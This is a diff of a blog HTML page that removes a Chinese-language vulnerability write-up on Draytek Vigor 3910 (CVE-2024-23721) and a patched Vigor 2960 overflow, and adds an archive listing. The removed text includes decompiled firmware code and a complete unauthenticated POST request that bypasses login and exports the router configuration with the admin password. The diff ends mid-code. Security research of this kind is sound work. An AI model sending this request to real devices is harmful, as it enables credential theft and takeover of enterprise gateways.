@@ -6,19 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://wzt.ac.cn">
-  <title>Draytek Vigor 3910 &amp; 2960 漏洞分析 | CataLpa&#39;s Site</title>
+  <title>Archives: 2024/9 | CataLpa&#39;s Site</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="本文对 Vigor 3910 的 CVE-2024-23721 和 Vigor 2960 的一个静默修复漏洞进行分析。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Draytek Vigor 3910 &amp; 2960 漏洞分析">
-<meta property="og:url" content="https://wzt.ac.cn/2024/08/12/CVE-2024-23721/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="CataLpa&#39;s Site">
+<meta property="og:url" content="https://wzt.ac.cn/archives/2024/09/index.html">
 <meta property="og:site_name" content="CataLpa&#39;s Site">
-<meta property="og:description" content="本文对 Vigor 3910 的 CVE-2024-23721 和 Vigor 2960 的一个静默修复漏洞进行分析。">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-08-11T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-08-12T06:50:09.618Z">
 <meta property="article:author" content="CataLpa">
 <meta name="twitter:card" content="summary">
   
@@ -164,233 +160,54 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-CVE-2024-23721" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
+            
+  
+  
     
-      <header class="article-header">
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2024" class="archive-year">2024</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	
+<a href="/2024/09/05/sonicwall_dec/" class="archive-article-date">
+        <time datetime="2024-09-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-09-05</time>
+</a>
+
+        </div>
+    	 
   
+    <h1 itemprop="name">
+	
+	  <a class="archive-article-title" href="/2024/09/05/sonicwall_dec/" target="_blank">SonicOS 固件解密 (2)</a>
   
-    <h1 class="article-title" itemprop="name">
-      Draytek Vigor 3910 &amp; 2960 漏洞分析
     </h1>
   
 
 
-  
-  
-<a href="/2024/08/12/CVE-2024-23721/" class="archive-article-date">
-        <time datetime="2024-08-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-08-12</time>
-</a>
-
-  
-  
-    
-<div style="margin-top:10px;">
-  <span class="post-time">
-    <span class="post-meta-item-icon">
-      <!-- fonts.scss -->
-      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
-      <i class="icon-statistics"></i>
-      <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">2.1k字</span>
-    </span>
-  </span>
-
-  <span class="post-time">
-    &nbsp; | &nbsp;
-    <span class="post-meta-item-icon">
-      <i class="icon-book icon"></i>
-      <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">9分</span>
-    </span>
-  </span>
-</div>
-
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>本文对 Vigor 3910 的 CVE-2024-23721 和 Vigor 2960 的一个静默修复漏洞进行分析。</p>
-<span id="more"></span>
-
-<p>Vigor 3910 和 2960 是台湾 Draytek(居易科技) 公司推出的核心网关设备，均包含 VPN 和防火墙功能，因此在企业场景具有一定的应用。</p>
-<h2 id="CVE-2024-23721"><a href="#CVE-2024-23721" class="headerlink" title="CVE-2024-23721"></a>CVE-2024-23721</h2><p>在上一篇<a href="https://wzt.ac.cn/2024/02/19/vigor_3910/">文章</a>中简单介绍了针对 Vigor 3910 的固件解包和模拟过程，3910 设备底层运行的是 Linux 系统，在系统中使用 qemu 模拟启动 sohod64.bin，该文件是 Draytek 自行实现的 DrayOS 系统，业务逻辑基本集中在此文件中。</p>
-<p>解包过程不再赘述，我们以 4.3.2.5 版本为例来分析。获取 sohod64.bin 后逆向分析此文件，在 0x40153890 地址找到一个函数，我称之为 <code>process_rquest</code>，该函数应该是处理 HTTP 请求的入口点，会解析请求中的各个字段</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 [1] 位置调用了 process_post 函数</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  iVar1 = FUN_406514d8(*(undefined4 *)(param_1 + <span class="number">0x4538</span>),&amp;DAT_40f85bb0);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar2 = FUN_40651424(<span class="string">&quot;/ACSServer/Upload&quot;</span>);</span><br><span class="line">    iVar1 = FUN_40651624(param_1 + <span class="number">0x3e2c</span>,<span class="string">&quot;/ACSServer/Upload&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      FUN_401a7f10(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = FUN_40651424(<span class="string">&quot;/SWMACSServer/Upload&quot;</span>);</span><br><span class="line">    iVar1 = FUN_40651624(param_1 + <span class="number">0x3e2c</span>,<span class="string">&quot;/SWMACSServer/Upload&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      process_post(param_1);    <span class="comment">// [1]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
-
-<p>当请求类型为 POST 时，会调用 0x4015F640 函数，我称之为 <code>process_post</code>，此函数负责处理 POST 类型请求，其中关键代码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">process_post</span><span class="params">(undefined4 *param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined auStack_14 [<span class="number">4</span>];</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  <span class="type">int</span> func_code;</span><br><span class="line">  undefined4 local_4;</span><br><span class="line">  </span><br><span class="line">  local_4 = get_curr_task_prio();</span><br><span class="line">  func_code = translate_name(param_1 + <span class="number">0xf8b</span>,param_1[<span class="number">0xf3e</span>]);    <span class="comment">// [2]</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (func_code &lt; <span class="number">0x1b6c</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (func_code == <span class="number">0x1b67</span>) &#123;    <span class="comment">// [3]</span></span><br><span class="line">        iVar1 = form_evaluate_access(<span class="string">&quot;/auth_check.cgi&quot;</span>,param_1 + <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">if</span> ((iVar1 != <span class="number">-1</span>) &amp;&amp; (iVar1 = check_sFormAuth(param_1[<span class="number">0x114d</span>]), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          iVar1 = FUN_401590c0(param_1,param_1[<span class="number">0xf3f</span>]);</span><br><span class="line">          <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">            die(<span class="number">0x1b50</span>,<span class="string">&quot;cfg_gci_export_script&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="number">0x1b67</span>,<span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>[2]</code> 处，代码会调用 <code>translate_name</code> 函数来处理请求中的 URL，这个函数会将 URL 和固定的字符串进行匹配</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (*URL == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    uVar2 = safe_strlen(<span class="string">&quot;Draytek&quot;</span>);</span><br><span class="line">    iVar1 = safe_strncmp(URL + <span class="number">1</span>,<span class="string">&quot;Draytek&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (iVar1 = <span class="built_in">strstr</span>(URL,<span class="string">&quot;.exp&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x1b67</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
-
-<p>当 URL 以 <code>/Draytek</code> 开头并且包含 <code>.exp</code> 字符串时，返回 0x1b67。</p>
-<p>回到 <code>process_post</code> 函数，当 <code>translate_name</code> 返回值为 0x1b67 时，来到 <code>[3]</code> 处，代码首先调用 <code>form_evaluate_access</code> 来检查请求是否合法。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">form_evaluate_access</span><span class="params">(__int64 fixed_url, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  fixed_url_1 = fixed_url;</span><br><span class="line">  v15 = a2;</span><br><span class="line">  v2 = get_curr_task_prio(fixed_url, a2);</span><br><span class="line">  v23 = get_request_info(v2);</span><br><span class="line">  fixed_url_1_1 = v23 + <span class="number">23932</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"> </span><br><span class="line">  v10 = safe_strlen(<span class="string">&quot;/auth_check.cgi&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !safe_strncmp(fixed_url_1_1, <span class="string">&quot;/auth_check.cgi&quot;</span>, v10) )    <span class="comment">// [4]</span></span><br><span class="line">    check_pass = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( check_pass &gt;= <span class="number">0</span> &amp;&amp; check_is_from_lan(v23, <span class="number">32</span> * check_pass + v2000_table) == <span class="number">-1</span> )    <span class="comment">// [5]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  dword_4262A750 = dword_47170A24;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>[4]</code> 处，会比较第一个参数是否等于 <code>/auth_check.cgi</code>，显然成立，所以变量 <code>check_pass</code> 为 0。</p>
-<p>接着来到 <code>[5]</code> 处，由于 <code>check_pass</code> 等于 0，会继续调用 <code>check_is_from_lan</code> 函数。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check_is_from_lan</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/weblogin.htm&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/cgi-bin/wlogin.cgi&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/doc/cgierr.htm&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/images/&quot;</span>)    <span class="comment">// [6]</span></span><br><span class="line">    || !sub_4010CD68(v2 + <span class="number">15916</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">LABEL_121:</span><br><span class="line">  <span class="keyword">if</span> ( !sub_4059A9D4(*(v2 + <span class="number">8</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">16</span>;</span><br><span class="line">    getpeername(*(v2 + <span class="number">8</span>), v11 + <span class="number">168</span>, v11 + <span class="number">184</span>);</span><br><span class="line">    v26 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_40140298(dword_47234F44) &amp;&amp; ((dword_4BE3E72C ^ v26) &amp; dword_4C3FF280) != <span class="number">0</span> &amp;&amp; sub_408A523C(v26, v9) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = sub_408A820C(v26);</span><br><span class="line">      <span class="keyword">if</span> ( (!v25 || !*(v25 + <span class="number">0x1C</span>LL) || (*(v25 + <span class="number">0x16</span>LL) &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp; !sub_4013FAF0(*(v25 + <span class="number">0x24</span>LL), v26))</span><br><span class="line">        &amp;&amp; ((dword_4BE3E758 &amp; <span class="number">1</span>) == <span class="number">0</span> || ((dword_4BE66B98 ^ v26) &amp; dword_4BE66B9C) != <span class="number">0</span>)</span><br><span class="line">        &amp;&amp; !IsFromLan(v26) )</span><br><span class="line">      &#123;</span><br><span class="line">        v38 = (dword_4BE3E758 &amp; <span class="number">4</span>) != <span class="number">0</span> &amp;&amp; (dword_4BE3E760 &amp; <span class="number">5</span>) != <span class="number">0</span> || (word_4BE5AA3A &amp; <span class="number">1</span>) == <span class="number">0</span> || IsFromLan(v40);</span><br><span class="line">        <span class="keyword">if</span> ( v38 &amp;&amp; !sub_4010B418(v26) &amp;&amp; !sub_4010B5FC() &amp;&amp; (word_4BE5AA3A &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          byte_4690CAF0 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;    <span class="comment">// [7]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>[6]</code> 处判断 URL 中是否包含 <code>/images/</code>，如果是则来到 <code>[7]</code> 处，令 <code>check_is_from_lan</code> 返回 1。回到 <code>form_evaluate_access</code> 函数，当 <code>check_is_from_lan</code> 返回 1 可以继续向下执行，因此 <code>form_evaluate_access</code> 函数也返回 1，在 <code>process_post</code> 函数中就通过了验证。</p>
-<p> 随后会调用 <code>check_sFormAuth</code> 函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">check_sFormAuth</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// w0</span></span><br><span class="line">  __int64 v4[<span class="number">3</span>]; <span class="comment">// [xsp+0h] [xbp+0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [xsp+1Ch] [xbp+1Ch]</span></span><br><span class="line">  _BYTE v6[<span class="number">20</span>]; <span class="comment">// [xsp+28h] [xbp+28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [xsp+3Ch] [xbp+3Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  safe_memset(v6, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">  v7 = <span class="built_in">strstr</span>(v5, <span class="string">&quot;sFormAuthStr=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v1 = safe_strlen(<span class="string">&quot;sFormAuthStr=&quot;</span>);</span><br><span class="line">  v7 += v1;</span><br><span class="line">  <span class="built_in">strncpy</span>(v4 + <span class="number">40</span>, v7, <span class="number">15LL</span>);    <span class="comment">// [8]</span></span><br><span class="line">  v6[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> cmp_authstr(v4 + <span class="number">40</span>) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">cmp_authstr</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> safe_strcmp(<span class="number">644</span> * dword_4264B86C + <span class="number">608</span> + &amp;unk_4FC06530 + <span class="number">8</span>, a1) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个函数会尝试获取请求中的 sFormAuthStr GET 参数，并调用 <code>cmp_authstr</code> 与内存中保存的数据比较。</p>
-<p>这里的问题是，无用户登录的情况下，内存中用于保存 sFormAuthStr 的地址内容为空(0x00)，当我们只传入 GET 参数名 <code>sFormAuthStr=</code>，而不跟随参数值时，在 <code>[8]</code> 处的 strncpy 拷贝的也是空值(0x00)。此时 strcmp 两个参数内容均为空，所以比较成立，导致 <code>check_sFormAuth</code> 返回验证成功。</p>
-<p>至此接口的两个验证函数都被绕过，可以直接访问最终的功能函数。回到 <code>process_post</code>，会继续执行 <code>die(0x1b50,&quot;cfg_gci_export_script&quot;);</code>，die 是一个很大的函数，第一个参数是功能对应的 opcode，第二个参数是功能名称，可以看到 0x1b50 对应配置文件导出。</p>
-<p>因此构造如下请求能够获取设备的配置文件，配置文件中包含系统管理员密码等敏感信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /Draytek.exp/images/?sFormAuthStr= HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line"></span><br><span class="line">chk_encryptcfg=170&amp;sEncryptPwd=&amp;sEncryptCnfrmPwd=&amp;sFormAuthStr=</span><br></pre></td></tr></table></figure>
-
-<p>以管理员身份登录后攻击者可以尝试寻找一些后台漏洞利用，并逃逸到底层的 Linux 系统，实现持久化控制。</p>
-<p>目前官方已经修复该漏洞，建议使用该设备的用户及时更新。</p>
-<h2 id="Vigor-2960-静默修复漏洞"><a href="#Vigor-2960-静默修复漏洞" class="headerlink" title="Vigor 2960 静默修复漏洞"></a>Vigor 2960 静默修复漏洞</h2><p>与 Draytek 其它型号不同，Vigor 2960 系列设备采用了 Linux 作为底层系统，并没有使用自研的 DrayOS。</p>
-<p>有关于 2960 出现过的历史漏洞，网络上有很多复现文章，感兴趣的朋友可以自行查找。需要注意的是该款设备已经处于 <a target="_blank" rel="noopener" href="https://www.draytek.com/support/product-lifecycle/">EOS</a> 状态，官方支持将持续到 2026 年 12 月，建议使用该设备的用户及时更换新的产品。</p>
-<p>在 2024 年 3 月，官方发布了 1.5.1.6 版本更新，该版本中包含对一个未授权远程代码执行漏洞的修复。</p>
-<p>web 服务的关键程序是 mainfunction.cgi，这里列举 1.5.1.5 和 1.5.1.6 两个版本代码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.5.1.5</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+100h] [bp-40h] BYREF</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/cvmcfgupload&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  v22 = <span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v21 &amp;&amp; (<span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u), v23 = time(<span class="number">0</span>), (v24 = <span class="built_in">strstr</span>(v21, <span class="string">&quot;session=&quot;</span>)) != <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="string">&quot;%s&quot;</span>, v24 + <span class="number">8</span>, <span class="number">11</span>);    <span class="comment">// [1]</span></span><br><span class="line">    v25 = strtoul(s, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    v26 = v23 - (v25 ^ (v25 &lt;&lt; <span class="number">16</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.5.1.6</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">52</span>]; <span class="comment">// [sp+104h] [bp-34h] BYREF</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/cvmcfgupload&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v20 = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v34, <span class="number">0</span>, <span class="keyword">sizeof</span>(v34));</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get apmd.general.status&quot;</span>);</span><br><span class="line">    v21 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v34, <span class="number">0</span>, <span class="keyword">sizeof</span>(v34));</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get cvmd.general.status&quot;</span>);</span><br><span class="line">    v21 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = sub_21F28(&amp;v33);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get acc_ctrl.access_control.user_define&quot;</span>);</span><br><span class="line">  v23 = sub_21F28(&amp;v33);</span><br><span class="line">  <span class="keyword">if</span> ( v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = <span class="built_in">strcmp</span>(v22, <span class="string">&quot;enable&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v23 )</span><br><span class="line">      v24 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v24 &amp;&amp; !<span class="built_in">strcmp</span>(v23, <span class="string">&quot;enable&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xC</span>u);</span><br><span class="line">        v25 = time(<span class="number">0</span>);</span><br><span class="line">        v26 = <span class="built_in">strstr</span>(v20, <span class="string">&quot;session=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">snprintf</span>(s, <span class="number">0xB</span>u, <span class="string">&quot;%s&quot;</span>, v26 + <span class="number">8</span>);    <span class="comment">// [2]</span></span><br><span class="line">          v27 = strtoul(s, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v25 - (v27 ^ (v27 &lt;&lt; <span class="number">16</span>)) &lt;= <span class="number">0x64</span> )</span><br><span class="line">            sub_11660(a3, v20, v21);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(v22);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v23 )</span><br><span class="line">    <span class="built_in">free</span>(v23);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 